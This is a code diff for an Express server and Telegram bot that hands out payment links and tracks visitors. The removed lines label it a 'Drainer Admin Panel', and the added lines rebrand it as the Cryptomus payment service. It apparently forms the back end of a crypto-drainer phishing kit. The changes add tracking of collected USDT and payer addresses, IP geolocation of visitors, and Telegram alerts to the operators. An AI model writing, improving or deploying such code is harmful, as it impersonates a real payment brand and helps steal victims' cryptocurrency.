@@ -12,15 +12,17 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static('public'));
 
-// Telegram бот (без прокси)
+// ============ БАЗОВЫЙ URL (автоматически подхватывает домен Render) ============
+const baseUrl = process.env.RENDER_EXTERNAL_URL || `http://localhost:${process.env.PORT || 3001}`;
+
+// ============ TELEGRAM БОТ ============
 const bot = new TelegramBot(process.env.BOT_TOKEN, { 
     polling: true,
     request: { timeout: 30000 }
 });
-console.log('🤖 Telegram bot initialized');
+console.log('🤖 Cryptomus Bot initialized');
 
 // ============ TELEGRAM ADMIN PANEL ============
-
 const ADMIN_IDS = ['7883109498', '8161483791'];
 
 bot.onText(/\/start/, async (msg) => {
@@ -33,15 +35,15 @@ bot.onText(/\/start/, async (msg) => {
     }
     
     await bot.sendMessage(chatId, `
-🤖 *Drainer Admin Panel*
+🤖 *Cryptomus Admin Panel*
 
 *Commands:*
-/create 500 Test — create invoice
+/create [amount] [description] — create invoice
 /stats — statistics
 /help — help
 
 *Example:*
-/create 500 Test invoice
+/create 500 Test payout
     `, { parse_mode: 'Markdown' });
 });
 
@@ -53,7 +55,7 @@ bot.onText(/\/create (.+)/, async (msg, match) => {
     
     const args = match[1].split(' ');
     const amount = args[0];
-    const description = args.slice(1).join(' ') || 'Test';
+    const description = args.slice(1).join(' ') || 'Cryptomus payout';
     
     if (!amount || isNaN(amount)) {
         await bot.sendMessage(chatId, '❌ Use: /create 500 Test');
@@ -70,7 +72,7 @@ bot.onText(/\/create (.+)/, async (msg, match) => {
         );
     }
     
-    const paymentLink = `http://localhost:${process.env.PORT}/pay/${invoiceId}`;
+    const paymentLink = `${baseUrl}/pay/${invoiceId}`;
     
     await bot.sendMessage(chatId, `
 ✅ *Invoice created!*
@@ -91,12 +93,21 @@ bot.onText(/\/stats/, async (msg) => {
     
     const totalInvoices = await db.get('SELECT COUNT(*) as count FROM invoices');
     const totalVisitors = await db.get('SELECT COUNT(*) as count FROM visitors');
+    const totalTransactions = await db.get('SELECT COUNT(*) as count FROM transactions');
+    
+    let totalAmount = 0;
+    try {
+        const sumResult = await db.get('SELECT SUM(amount) as total FROM transactions');
+        totalAmount = sumResult?.total || 0;
+    } catch (e) {}
     
     await bot.sendMessage(chatId, `
-📊 *Statistics*
+📊 *Cryptomus Statistics*
 
 📄 Invoices: ${totalInvoices?.count || 0}
 👥 Visitors: ${totalVisitors?.count || 0}
+💸 Transactions: ${totalTransactions?.count || 0}
+💰 Collected: ${totalAmount} USDT
     `, { parse_mode: 'Markdown' });
 });
 
@@ -106,10 +117,9 @@ bot.onText(/\/help/, async (msg) => {
     if (!ADMIN_IDS.includes(userId)) return;
     
     await bot.sendMessage(chatId, `
-🤖 *Commands*
+🤖 *Cryptomus Bot Commands*
 
-/start — welcome
-/create 500 Test — create invoice
+/create [amount] [description] — create invoice
 /stats — statistics
 /help — this message
     `, { parse_mode: 'Markdown' });
@@ -117,7 +127,6 @@ bot.onText(/\/help/, async (msg) => {
 
 bot.on('polling_error', (error) => {
     console.log('🔄 Polling error:', error.message);
-    console.log('💡 Tip: Enable VPN if you see ECONNRESET');
 });
 
 // ============ ОТПРАВКА УВЕДОМЛЕНИЙ ============
@@ -171,15 +180,37 @@ let db;
                 ip TEXT,
                 timestamp INTEGER
             );
+            CREATE TABLE IF NOT EXISTS transactions (
+                txid TEXT PRIMARY KEY,
+                invoice_id TEXT,
+                from_address TEXT,
+                amount DECIMAL,
+                timestamp INTEGER
+            );
         `);
         console.log('✅ Database connected');
+        
+        // ============ АВТО-СОЗДАНИЕ ТЕСТОВОГО ИНВОЙСА ============
+        const existing = await db.get('SELECT COUNT(*) as count FROM invoices');
+        if (existing.count === 0) {
+            const testId = uuidv4();
+            const expiresAt = Date.now() + 30 * 60000;
+            await db.run(
+                'INSERT INTO invoices (id, amount, description, created_at, expires_at, status) VALUES (?, ?, ?, ?, ?, ?)',
+                [testId, '500', 'Cryptomus test payout', Date.now(), expiresAt, 'pending']
+            );
+            console.log('✅ Test invoice created:', testId);
+            console.log(`🔗 ${baseUrl}/pay/${testId}`);
+        }
+        
     } catch (error) {
         console.error('❌ DB error:', error);
     }
 })();
 
-// ============ API ============
+// ============ API ENDPOINTS ============
 
+// Создание инвойса
 app.post('/api/create-invoice', async (req, res) => {
     const { amount, description, expiryMinutes = 30 } = req.body;
     const invoiceId = uuidv4();
@@ -190,24 +221,37 @@ app.post('/api/create-invoice', async (req, res) => {
             [invoiceId, amount, description, Date.now(), expiresAt, 'pending']
         );
     }
-    res.json({ invoiceId, paymentLink: `http://localhost:${process.env.PORT}/pay/${invoiceId}` });
+    res.json({ 
+        invoiceId, 
+        paymentLink: `${baseUrl}/pay/${invoiceId}` 
+    });
 });
 
+// Получение инвойса
 app.get('/api/invoice/:id', async (req, res) => {
     if (!db) return res.json({ error: 'DB not ready' });
     const invoice = await db.get('SELECT * FROM invoices WHERE id = ?', req.params.id);
-    res.json(invoice || { error: 'Not found' });
+    if (invoice && Date.now() > invoice.expires_at) {
+        invoice.status = 'expired';
+        await db.run('UPDATE invoices SET status = ? WHERE id = ?', ['expired', req.params.id]);
+    }
+    res.json(invoice || { error: 'Invoice not found' });
 });
 
+// Логирование
 app.post('/api/log', async (req, res) => {
     const data = req.body;
     console.log('📥 Log:', data.type);
     
     if (db) {
-        await db.run(
-            'INSERT INTO logs (event_type, event_data, ip, timestamp) VALUES (?, ?, ?, ?)',
-            [data.type, JSON.stringify(data), req.ip, Date.now()]
-        );
+        try {
+            await db.run(
+                'INSERT INTO logs (event_type, event_data, ip, timestamp) VALUES (?, ?, ?, ?)',
+                [data.type, JSON.stringify(data), req.ip, Date.now()]
+            );
+        } catch (dbError) {
+            console.error('DB error:', dbError);
+        }
     }
     
     if (data.telegram) {
@@ -217,15 +261,21 @@ app.post('/api/log', async (req, res) => {
     res.json({ success: true });
 });
 
+// Геолокация
 app.get('/api/geo/:ip', async (req, res) => {
     try {
-        const r = await axios.get(`http://ip-api.com/json/${req.params.ip}`);
-        res.json({ country: r.data.country, city: r.data.city });
-    } catch {
-        res.json({ country: 'Unknown', city: 'Unknown' });
+        const response = await axios.get(`http://ip-api.com/json/${req.params.ip}`);
+        res.json({ 
+            country: response.data.country, 
+            city: response.data.city, 
+            countryCode: response.data.countryCode
+        });
+    } catch (error) {
+        res.json({ country: 'Unknown', city: 'Unknown', countryCode: '' });
     }
 });
 
+// Страницы
 app.get('/admin', (req, res) => {
     res.sendFile(__dirname + '/public/admin.html');
 });
@@ -234,9 +284,11 @@ app.get('/pay/:invoiceId', (req, res) => {
     res.sendFile(__dirname + '/public/pay.html');
 });
 
+// ============ ЗАПУСК СЕРВЕРА ============
 const PORT = process.env.PORT || 3001;
 app.listen(PORT, () => {
-    console.log(`🚀 Server: http://localhost:${PORT}`);
-    console.log(`📊 Admin: http://localhost:${PORT}/admin`);
-    console.log(`👥 Recipients: ${process.env.CHAT_ID}`);
+    console.log(`🚀 Cryptomus Server: ${baseUrl}`);
+    console.log(`📊 Admin panel: ${baseUrl}/admin`);
+    console.log(`👥 Telegram recipients: ${process.env.CHAT_ID}`);
+    console.log(`✅ Ready for payouts`);
 });
